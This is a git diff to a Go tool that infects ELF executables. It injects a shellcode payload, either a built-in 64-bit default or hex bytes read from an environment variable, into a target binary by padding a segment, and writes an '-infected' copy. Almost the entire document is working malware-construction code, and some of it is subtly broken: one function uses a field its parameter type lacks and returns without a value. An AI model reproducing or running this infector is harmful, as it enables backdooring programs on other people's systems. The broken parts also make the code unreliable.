@@ -24,15 +24,24 @@ import (
 	"io/ioutil"
 	"os"
 	"encoding/binary"
+	"encoding/hex"
 	"log"
 	"flag"
+	"errors"
+	"strings"
 )
 
 const (
 	PAGE_SIZE     int    = 4096
 )
 
-var payload64 = []byte{
+type targetBin struct {
+	payload bytes.Buffer			//payload to inject into binary
+	arch elf.Class					//elf binary ARCH (32 or 64-bit ?)
+	oFileHandle *os.File 			//file handle for binary
+}
+
+var defaultPayload64 = []byte{
 	0x57,       //push   %rdi
 	0x56,       //push   %rsi
 	0x52,       //push   %rdx
@@ -78,9 +87,40 @@ var payload64 = []byte{
 	*/
 }
 
+func getPayloadFromEnv(p io.Writer, key string) (int, error) {
+	val, ok := os.LookupEnv(key)
+	if ! ok {
+		errorString := "Environmental variable " + key + " is not set"
+		return 0, errors.New(errorString)
+	}
+	
+	if val == "" {
+		errorString := "Environmental variable " + key + " contains no payload"
+		return 0, errors.New(errorString)
+	}
+	val =  strings.ReplaceAll(val, "\\x", "")
+	decoded, err :=  hex.DecodeString(val)
+	if err != nil {
+		log.Fatal(err)
+	}
 
-func isElf(magic []byte) bool {
+	return p.Write(decoded)
+}
+
+func isElf(e io.Reader) bool {
+	magic := make([]byte, 4)
+	e.Read(magic)
 	return !(magic[0] != '\x7f' || magic[1] != 'E' || magic[2] != 'L' || magic[3] != 'F')
+}
+
+func getClass(e io.Reader) elf.Class {
+	var ident [16]uint8
+	if _, err := e.oFileHandle.Seek(0, io.SeekStart); err != nil {
+		fmt.Println(err)
+		return
+	}
+	e.Read(ident[:])
+	return elf.Class(ident[elf.EI_CLASS])
 }
 
 func checkError(e error) {
@@ -89,8 +129,9 @@ func checkError(e error) {
 	}
 }
 
-func infectBinary(origFileHandle *os.File, pEnv *string, debug bool) {
-	fStat, err := origFileHandle.Stat()
+func (t *targetBin) infectBinary(debug bool) {
+	payload64 := t.payload.Bytes()
+	fStat, err := t.oFileHandle.Stat()
 	if err != nil {
 		fmt.Println(err)
 		return
@@ -98,12 +139,12 @@ func infectBinary(origFileHandle *os.File, pEnv *string, debug bool) {
 
 	origFileBuf := make([]byte, fStat.Size())
 	
-	if _, err := origFileHandle.Seek(0, io.SeekStart); err != nil {
+	if _, err := t.oFileHandle.Seek(0, io.SeekStart); err != nil {
 		fmt.Println(err)
 		return
 	}
 	
-	if _, err := origFileHandle.Read(origFileBuf[:]); err != nil {
+	if _, err := t.oFileHandle.Read(origFileBuf[:]); err != nil {
 		fmt.Println(err)
 		return
 	}
@@ -161,13 +202,14 @@ func infectBinary(origFileHandle *os.File, pEnv *string, debug bool) {
 
 			if debug {
 				fmt.Printf("[+] Payload size post-epilogue 0x%x\n", len(payload64))
-						
+				
 				fmt.Println("------------------PAYLOAD----------------------------")
-				fmt.Print("[")
+				/*fmt.Print("[")
 				for _, h := range payload64 {
 					fmt.Printf("0x%02x ", h)
 				}
-				fmt.Println("]")
+				fmt.Println("]")*/
+				fmt.Printf("%s", hex.Dump(payload64))
 				fmt.Println("--------------------END------------------------------")
 			}
 			pHeaders[i].Memsz += uint64(len(payload64))
@@ -245,7 +287,7 @@ func infectBinary(origFileHandle *os.File, pEnv *string, debug bool) {
 	
 	copy(finalInfectionTwo[endOfInfection:], payload64)
 	copy(finalInfectionTwo[endOfInfection + PAGE_SIZE:], finalInfection[endOfInfection:])
-	infectedFileName := fmt.Sprintf("%s-infected", origFileHandle.Name())
+	infectedFileName := fmt.Sprintf("%s-infected", t.oFileHandle.Name())
 
 	if err := ioutil.WriteFile(infectedFileName, finalInfectionTwo, 0751); err !=nil {
 		fmt.Println(err)
@@ -257,29 +299,58 @@ func infectBinary(origFileHandle *os.File, pEnv *string, debug bool) {
 
 func main() {
 
-	debug := flag.Bool("d", false, "see debug out put (generated payload, modifications, etc)")
-	pEnv := flag.String("e", "DOZEREGG", "name of the environmental variable holding the payload")
-	origFile := flag.String("t", "", "path to binary targetted for infection")
+	debug := flag.Bool("debug", false, "see debug out put (generated payload, modifications, etc)")
+	pEnv := flag.String("payloadEnv", "", "name of the environmental variable holding the payload")
+	oFile := flag.String("target", "", "path to binary targetted for infection")
+	pFile := flag.String("payloadBin", "", "path to binary containing payload")
 	flag.Parse()
 
-	if *origFile == "" {
+	if *oFile == "" {
+		flag.PrintDefaults()
 		log.Fatal("No target binary supplied")
 	}
 
-	origFileHandle, err := os.Open(*origFile)
+	oFileHandle, err := os.Open(*oFile)
 	if err != nil {
 		log.Fatal(err)
 	}
 
-	defer origFileHandle.Close()
-
-	var magic [4]byte
-	origFileHandle.Read(magic[:])
-
-	if !isElf(magic[:4]) {
+	defer oFileHandle.Close()
+	
+	if !isElf(oFileHandle) {
 		fmt.Println("This is not an Elf binary")
 		return
 	}
+	
+	t := new(targetBin)
+	t.oFileHandle = oFileHandle
+	t.arch = getClass(oFileHandle)
 
-	infectBinary(origFileHandle, pEnv, *debug)
+	
+	switch {
+	
+	case *pEnv != "" && *pFile != "":
+		flag.PrintDefaults()
+		return
+
+	case *pEnv == "" && *pFile == "":
+		if t.arch == elf.ELFCLASS64 {
+			t.payload.Write(defaultPayload64)
+		}else{
+			fmt.Println("No support for 32-bit payloads yet.")
+			return
+		}
+
+	case *pEnv != "":
+		if _,err := getPayloadFromEnv(&t.payload, *pEnv); err != nil {
+			fmt.Println(err)
+			return
+		}
+	
+	case *pFile != "":
+		fmt.Println("Getting payload from an ELF binary .text segment is not yet supported")
+		return
+	}
+
+	t.infectBinary(*debug)
 }
